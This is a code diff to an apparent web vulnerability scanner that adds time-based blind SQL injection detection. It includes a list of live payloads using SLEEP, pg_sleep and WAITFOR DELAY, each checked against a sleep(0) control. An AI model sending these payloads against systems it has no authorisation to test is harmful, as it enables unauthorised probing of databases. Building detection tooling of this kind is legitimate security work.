@@ -430,12 +430,22 @@ class Scanner:
                 # before we give up on the param.
                 if (200 <= baseline.status_code < 300
                         and point.location.value in ("query", "body", "json")):
-                    amp = self._boolean_amplify_probe(
+                    # A param that looks inert to '/'*' probes can still be a
+                    # BLIND injection (boolean or time-based) with no error and
+                    # no content change. Run the blind battery before giving up
+                    # — both are cheap on genuinely inert params (fast requests).
+                    bfind = self._boolean_ratio_detect(
                         url, method, data, content_type, extra_headers,
-                        point, baseline, report, max_pairs=1,
+                        point, baseline, report,
                     )
-                    if amp is not None:
-                        return amp
+                    if bfind is not None:
+                        return bfind
+                    tfind = self._test_time_based(
+                        url, method, data, content_type, extra_headers,
+                        point, baseline, report,
+                    )
+                    if tfind is not None:
+                        return tfind
                 return None  # dead param — ignores its value entirely
 
             if quote_errors:
@@ -520,6 +530,14 @@ class Scanner:
                     )
                     if bfind is not None:
                         return bfind
+                    # Time-based blind: the classic "no error, no content
+                    # change" case — the only thing that reveals it is a delay.
+                    tfind = self._test_time_based(
+                        url, method, data, content_type, extra_headers,
+                        point, baseline, report,
+                    )
+                    if tfind is not None:
+                        return tfind
                 return self._test_nosql(
                     url, method, data, content_type, extra_headers, point, baseline, report
                 )  # None if not NoSQL-injectable either
@@ -746,6 +764,15 @@ class Scanner:
             if ufind is not None:
                 return ufind
 
+        # Time-based blind (fallback): catches blind injections with no error
+        # and no content change. Cheap on non-injectable params.
+        if not self.fast and point.location.value in ("query", "body", "json"):
+            tfind = self._test_time_based(
+                url, method, data, content_type, extra_headers, point, baseline, report
+            )
+            if tfind is not None:
+                return tfind
+
         # NoSQL injection pair testing (fallback when SQL found nothing).
         nosql_finding = self._test_nosql(
             url, method, data, content_type, extra_headers, point, baseline, report
@@ -899,6 +926,61 @@ class Scanner:
                     mism += 1
             char_ratio = mism / checked if checked else 0.0
         return max(len_ratio, char_ratio)
+
+    def _test_time_based(
+        self, url, method, data, content_type, extra_headers, point, baseline, report,
+    ) -> Optional[Finding]:
+        """Time-based blind detection (the technique from the oscuridad Nuclei
+        template): inject a ``SLEEP()``/``pg_sleep()``/``WAITFOR DELAY`` across
+        several boundary contexts. If the response is delayed by ~the requested
+        seconds AND a ``sleep(0)`` control returns fast, it's a confirmed
+        time-based injection. This catches BLIND injections that emit no error
+        and don't change the page content — which every other technique misses.
+
+        Cheap on non-injectable params (the sleep is a literal string → fast
+        response); only genuinely injectable params incur the delay.
+        """
+        if self.fast:
+            return None
+        sleep_s = max(1, int(round(self._sleep_ms / 1000)))
+        thresh = self._sleep_ms * 0.7
+        orig = point.original_value or ""
+        # (payload template, control template) — control replaces the delay
+        # with an instant one so a slow server/network can't cause a false hit.
+        templates = [
+            ("' OR SLEEP({s})-- -", "' OR SLEEP(0)-- -"),
+            (" OR SLEEP({s})-- -", " OR SLEEP(0)-- -"),
+            ("' AND SLEEP({s})-- -", "' AND SLEEP(0)-- -"),
+            ("'||pg_sleep({s})-- -", "'||pg_sleep(0)-- -"),
+            ("';SELECT pg_sleep({s})-- -", "';SELECT pg_sleep(0)-- -"),
+            ("';WAITFOR DELAY '0:0:{s}'-- -", "';WAITFOR DELAY '0:0:0'-- -"),
+        ]
+        for tpl, ctrl_tpl in templates:
+            payload = tpl.format(s=sleep_s)
+            ex = self.probe.send(
+                url, method, data, content_type, extra_headers,
+                inject_point=point, payload=orig + payload,
+            )
+            ex.expected_sleep_ms = self._sleep_ms
+            report.add_request()
+            delay = ex.response_time_ms - baseline.response_time_ms
+            if delay < thresh:
+                continue
+            # Confirm: sleep(0) control must be fast.
+            ctrl_ex = self.probe.send(
+                url, method, data, content_type, extra_headers,
+                inject_point=point, payload=orig + ctrl_tpl,
+            )
+            report.add_request()
+            ctrl_delay = ctrl_ex.response_time_ms - baseline.response_time_ms
+            if ctrl_delay < thresh * 0.6:
+                return self._build_finding(
+                    point, ex, baseline,
+                    f"Time-based blind: {payload!r} delayed response +{delay:.0f}ms "
+                    f"(~{sleep_s}s); control sleep(0) returned fast (+{ctrl_delay:.0f}ms)",
+                    0.9, inj_type=InjectionType.TIME_BLIND,
+                )
+        return None
 
     def _test_union(
         self, url, method, data, content_type, extra_headers, point, baseline, report,
